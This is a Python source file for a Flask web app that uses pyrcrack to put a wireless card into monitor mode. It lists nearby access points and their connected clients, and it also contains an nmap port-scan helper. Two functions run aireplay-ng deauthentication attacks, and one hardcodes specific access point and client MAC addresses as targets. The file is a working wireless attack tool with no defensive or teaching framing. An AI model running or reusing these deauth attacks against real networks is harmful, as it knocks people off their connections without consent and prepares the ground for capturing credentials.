import pyrcrack
import nmap
import sys
import asyncio
import json
from flask import Flask 
from async_timeout import timeout
from contextlib import suppress

app = Flask(__name__)
loop = asyncio.get_event_loop()
asyncio.get_child_watcher().attach_loop(loop)


@app.route("/")
def index():
    return "Index"


def runNmap(ip):
    # ip = '10.202.208.1'
    ports = '30'
    nm = nmap.PortScanner()
    nm.scan(ip, ports)
    print("scan info")
    print(nm.scaninfo())
    print("")
    print("hosts:")
    hosts = nm.all_hosts()
    print(hosts)
    print("")
    print("hostnames:")
    for x in hosts:
        # tempIP = '10.202.208.' + str((x + 1))
        print(nm[x].hostname())

async def attack(interface, apo):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], apo.channel)
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(
                interface['interface'], deauth=sys.argv[1], D=True)
            print(await aireplay.proc.communicate())

async def attack1(interface):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], "1")
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(
                    interface['interface'], deauth="5", D=True, a="B4:FB:E4:20:97:E8", c="7C:04:D0:62:77:EE" )
            print(await aireplay.proc.communicate())

@app.route("/aps")
def getAps():
    result = loop.run_until_complete(getApsHelper())
    return result

async def getApsHelper():
    """Scan for targets, return json."""
    apsList= []
    async with pyrcrack.AirmonNg() as airmon:
        interface = (await airmon.list_wifis())[0]['interface']
        interface = (await airmon.set_monitor(interface))[0]
        async with pyrcrack.AirodumpNg() as pdump:
            await pdump.run(interface['interface'], write_interval=1)
            await asyncio.sleep(15)
            aps = pdump.sorted_aps()
            for ap in aps:
                currentDict = {"bssid": ap.bssid, "essid": ap.essid,"channel": ap.channel, "clients": [c.station_mac for c in ap.clients]}
                apsList.append(currentDict)
           # await attack1(interface)
            print(json.dumps(apsList))
    return json.dumps(apsList)


if __name__ == "__main__":
    app.run()

# runNmap('10.202.208.1-30')
#asyncio.run(getApsHelper())
# asyncio.run(printing())
